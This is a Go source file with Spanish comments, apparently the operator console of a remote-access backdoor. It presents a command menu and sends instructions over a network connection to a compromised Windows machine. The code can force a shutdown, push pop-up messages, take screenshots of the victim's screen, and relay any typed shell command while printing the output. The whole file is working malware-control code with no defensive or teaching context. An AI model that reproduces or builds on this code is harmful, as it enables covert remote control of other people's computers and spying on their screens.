// modulo que prepara los comandos a enviar al backdoor
package remoto

import (
	color "comando/colores"
	"comando/conex/comandos/ss"
	"comando/input"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

const INSTRUCCION = `
//comandos basicos:       //
//[0] limpiar consola     //       
//[1] apagar equipo       //
//[2] enviar mensaje      //
//[q] salir               //
//[ss] capturar pantalla  //
`

// funcion que abstrae el envio de paquetes al host
func envio(conexiones net.Conn, envio string) error {

	err_t := conexiones.SetDeadline(time.Now().Add(time.Second * 2))
	if err_t != nil {
		return errors.New("tiempo agotado")
	}

	buffer := make([]byte, 20000)

	_, error := conexiones.Write([]byte(envio))
	if error != nil {
		return errors.New("[!] hubo un problema durante el envio del comando")

	} else {
		// retornar los datos
		num, error := conexiones.Read(buffer)
		if error != nil {
			return errors.New("[!] error al recibir la informacion")

		} else {
			fmt.Println(string(buffer[:num]))
		}

	}
	return nil
}

// funcion cuyo proposito es la ejecucion de comandos
func Comando(conexiones net.Conn) error {
	var reconectar = errors.New("reconexion")
	for {

		println(color.Violeta + INSTRUCCION + color.Reset)
		entrada := input.Input("[#] comando >> ")
		switch entrada {
		case "0":
			comando := exec.Command("powershell", "-command", "clear")
			error := comando.Run()
			fmt.Println(color.Violeta + color.LOGO + color.Reset)
			if error != nil {
				return errors.New("[!] error al ejecutar comando")
			}

		case "1":
			err := envio(conexiones, "shutdown /s")
			if err != nil {
				return err
			}
		case "2": // automatizacion de msg para ciertas ediciones de windows

			mensaje := input.Input("mensaje >> ")
			msg_format := fmt.Sprintf("msg * %s", mensaje)
			envio(conexiones, msg_format)
			return reconectar

		case "q":
			fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
			conexiones.Close()
			os.Exit(0)
		case "ss":
			byte_img, error := ss.Obtener_img(conexiones)
			if error != nil {
				return errors.New("[!] error al obtener la imagen")
			}
			nombre := input.Input("[*] nombre del png (sin extension)>> ")
			ss.Escribir_img(byte_img, nombre)
			return reconectar

		default:
			err := envio(conexiones, entrada)
			if err != nil {
				return err
			}
			continue

		}

	}
}
